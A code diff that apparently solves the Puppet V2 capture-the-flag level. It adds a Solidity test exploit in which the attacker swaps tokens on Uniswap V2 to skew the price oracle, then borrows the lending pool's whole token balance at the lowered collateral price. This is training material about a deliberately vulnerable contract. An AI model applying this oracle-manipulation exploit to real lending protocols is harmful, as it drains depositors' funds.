@@ -104,6 +104,23 @@ contract PuppetV2 is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, address(attacker), DEADLINE);
+
+        uint256 depositRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Depoist Required (after swap): ", depositRequired);
+
+        weth.deposit{value: depositRequired}();
+        weth.approve(address(puppetV2Pool), depositRequired);
+
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
         /**
          * EXPLOIT END *
          */
